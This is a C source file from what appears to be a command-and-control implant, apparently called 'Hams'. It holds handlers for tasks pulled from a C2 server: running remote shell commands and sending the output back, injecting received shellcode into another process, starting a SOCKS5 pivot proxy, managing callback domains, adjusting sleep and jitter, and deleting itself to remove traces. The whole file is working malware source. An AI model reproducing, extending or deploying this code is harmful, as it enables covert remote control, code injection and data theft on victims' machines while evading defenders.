#include "Support/String.h"
#include "Macro/Macro.h"
#include "Debug.h"
#include "Transport/Transport.h"
#include "Support/Memory.h"
#include "Support/General.h"
#include "Core/Initialiser.h"
#include "Parser/Parser.h"
#include "Core/Tasks/Modules/Execution.h"
#include "Core/Tasks/Modules/Injection.h"
#include "Core/Tasks/Modules/Accessory.h"
#include "Core/Tasks/Modules/Socks5.h"
#include "Core/Tasks/Core.h"
#include "Packer/Packer.h"
#include "Cryptography/Encryption.h"
#include "Hams.h"
#include <process.h>
#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>

#endif

int ChangeSleep_ID_5()
{
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));

    if (!DownloadTask(MacroChangeSleepStrAT, Parser))
    {
        RED_DPRINT("Fail To Download Change Sleep Task!\n")
        goto Clean;
    }
    int NewSleep = ParserGetInt32(Parser);
    int NewJit = ParserGetInt32(Parser);
    RED_DPRINT("Change Sleep To [%d] Jit [%d]\n", NewSleep,NewJit); // need to retun data to C2 to notify sleep is changed
    Hams->Sleep = NewSleep;
    Hams->Jetter=NewJit;
Clean:
    ParserDestroy(Parser);
    return 1;
}

int Shell_ID_6()
{
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    char *Result = NULL;
    int Len = 0;
    if (!DownloadTask(MacroShellStrAT, Parser))
    {
        RED_DPRINT("Fail To Download Shell Task!\n")
        goto Clean;
    }
    char *Command = ParserGetBytes(Parser, &Len);

    RED_DPRINT("Command [%s] Len [%d]\n", Command, Len); // TODO to retun data to C2 to notify sleep is changed

    int TSize = 0;
    int ok = 0;
    ok = ExecuteCommand(Command, &TSize, &Result);
    if (!ok || TSize == 0)
    {
        RED_DPRINT("ExecuteCommand No Data\n"); // TODO retun data to C2 to notify sleep is changed

        goto Clean;
    }
    RED_DPRINT("Result [%s] Len [%d]\n", Result, TSize); // TODO to retun data to C2 to notify sleep is changed

    PPACKAGE Packge = 0;
    Packge = PackageCreate();
    PackageAddBytes(Packge, Result, TSize);
    SendResult(Packge->Buffer, Packge->Length, MacroShellResultCodeAT, MacroShellResultRemaingCodeAT);
    RED_DPRINT("Shell_ID_6 PackageDestroy");
    PackageDestroy(Packge);
Clean:
    ParserDestroy(Parser);
    HFree(Result, TSize);
    return 1;
}

int Inject_ID_17()
{
    GREEN_DPRINT("Run Injection Task")
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    int ShellCodeSize = 0;
    unsigned char *ShellCode;
    int ProcessID = 0;
    if (!DownloadTask(MacroInjectStrAT, Parser))
    {
        RED_DPRINT("Fail To Download Inject Task!\n")
        goto Clean;
    }
    DPRINT("ShellCode\n");
    ShellCode = ParserGetBytes(Parser, &ShellCodeSize);
    for (size_t i = 0; i < ShellCodeSize; i++)
    {
        DPRINT("%02x ", ShellCode[i]);
    }
    DPRINT("\n");

    ProcessID = ParserGetInt32(Parser);
    GREEN_DPRINT("ShellCode Size [%d]\n", ShellCodeSize);

    Inject(ShellCode, ShellCodeSize, ProcessID);

Clean:
    ParserDestroy(Parser);
    return 1;
}

int StartProxy_ID_12()
{
    GREEN_DPRINT("Run StartProxy Task")
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    int SocksProxyDomainSize = 0;
    unsigned char *tmpSocksProxyDomain = 0;
    unsigned char *tmpSocksProxyPort = 0;
    int SocksProxyPortSize = 0;
    if (!DownloadTask(MacroStartProxyStrAT, Parser))
    {
        RED_DPRINT("Fail To Download Inject Task!\n")
        goto Clean;
    }
    tmpSocksProxyDomain = ParserGetBytes(Parser, &SocksProxyDomainSize);
    tmpSocksProxyPort = ParserGetBytes(Parser, &SocksProxyPortSize);
    ProxyInfo *Info = HMalloc(sizeof(ProxyInfo));
    Info->host = HMalloc(SocksProxyDomainSize);
    Info->hostsize = SocksProxyDomainSize;
    Memcpy(Info->host, tmpSocksProxyDomain, SocksProxyDomainSize);
    Info->port = HMalloc(SocksProxyPortSize);
    Info->portsize = SocksProxyPortSize;
    Memcpy(Info->port, tmpSocksProxyPort, SocksProxyPortSize);

    GREEN_DPRINT("Socks Proxy Connect to %s on port %s", Info->host, Info->port);
    _beginthread(StartSocks5, 0, (void *)Info);

Clean:
    ParserDestroy(Parser);
    return 1;
}

int StopProxy_ID_14()
{
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    if (!DownloadTask(MacroStopProxyStrAT, Parser))
    {
        RED_DPRINT("Fail To Download Change Sleep Task!\n")
        goto Clean;
    }

    GREEN_DPRINT("Run StoptProxy Task")
    CloseProxy();

Clean:
    ParserDestroy(Parser);
    return 1;
}

int AddNewCallBackDomain_ID_18()
{
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    if (!DownloadTask(MacroNewCallBackDomainStrAT, Parser))
    {
        RED_DPRINT("Fail To Download AddNewCallBackDomain Task!\n")
        goto Clean;
    }
    char *Domain = NULL;
    int SizeNewDomain = 0;
    Domain = ParserGetBytes(Parser, &SizeNewDomain);

    RED_DPRINT("New Domain [%s]\n", Domain);

    if (SizeNewDomain <= 0)
    {
        goto Clean;
    }

    if (!ValidateNewCallBackDomain(Domain))
    {
        goto Clean;
    }
    addDomainName(Domain);
    YELLOW_DPRINT("Add Domain [%s] and Number OF Domain [%d]\n", Domain, Hams->C2DomainsCount);
Clean:
    ParserDestroy(Parser);
    return 1;
}

int DeleteCallBackDomain_ID_19()
{
    
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    if (!DownloadTask(MacroDeleteCallBackDomainStrAT, Parser))
    {
        RED_DPRINT("Fail To Download DeleteCallBackDomain Task!\n")
        goto Clean;
    }
    char *NewDomain = NULL;
    char *Domain = NULL;
    int SizeNewDomain = 0;
    Domain = ParserGetBytes(Parser, &SizeNewDomain);

        RED_DPRINT("Delete Domain [%s] \n", Domain);

    if (SizeNewDomain <= 0)
    {
        goto Clean;
    }

    if (!DeleteCallBackDomain(Domain))
    {
        RED_DPRINT("DeleteCallBackDomain Error Domain Not Found!\n");
        goto Clean;
    }

    if (!SendSuccessDeleteCallBackDomain())
    {
        RED_DPRINT("SendSuccessDeleteCallBackDomain\n");
        goto Clean;
    }
        YELLOW_DPRINT("Delete Domain [%s] and Number OF Domain [%d]\n", Domain, Hams->C2DomainsCount);

Clean:
    ParserDestroy(Parser);
    return 1;
}



int ListAllActiveDomains_ID_22()
{
    
    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));
    if (!DownloadTask(MacroListAllActiveDomainsStrAT, Parser))
    {
        RED_DPRINT("Fail To Download DeleteCallBackDomain Task!\n")
        goto Clean;
    }

    int DomainSize=0;
    int DomainCount=0;
    char*ActiveDomains=GetAllActiveDomains(&DomainCount,&DomainSize);
    if(ActiveDomains==0 || DomainSize==0 ||DomainCount==0){
        RED_DPRINT("Unable to get Domains");
        goto Clean;
    }
    GREEN_DPRINT("All Domains [%s] Count [%d] Size [%d]",ActiveDomains,DomainCount,DomainSize);
    PPACKAGE Packge = 0;
    Packge = PackageCreate();
    //PackageAddInt32(Packge,DomainCount);
    PackageAddBytes(Packge, ActiveDomains, DomainSize);
    SendResult(Packge->Buffer, Packge->Length, MacroShellResultCodeAT, MacroShellResultRemaingCodeAT);
    PackageDestroy(Packge);

Clean:
    HFree(ActiveDomains,DomainSize);
    ParserDestroy(Parser);
    return 1;
}




int SelfKill_ID_16()
{
        RED_DPRINT("Download Self Kill Task!\n")

    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));

    if (!DownloadTask(MacroSelfKillAT, Parser))
    {
        RED_DPRINT("Fail To Download Self Kill Task!\n")
        goto Clean;
    }
   
    int wipe= ParserGetInt32(Parser);
     RED_DPRINT("wipe %d\n",wipe);
    if(wipe){
        RED_DPRINT("Self Delete Agent\n")
        SelfDelete();
    }
    
    exit(0);
Clean:
    ParserDestroy(Parser);
    return 1;
}


int SelfDel_ID_15()
{
        RED_DPRINT("Download Self Del Task!\n")

    PPARSER Parser = (PPARSER)HMalloc(sizeof(PARSER));

    if (!DownloadTask(MacroSelfDelAT, Parser))
    {
        RED_DPRINT("Fail To Download Self Kill Task!\n")
        goto Clean;
    }
    RED_DPRINT("Self Delete Agent\n")
        SelfDelete();

Clean:
    ParserDestroy(Parser);
    return 1;
}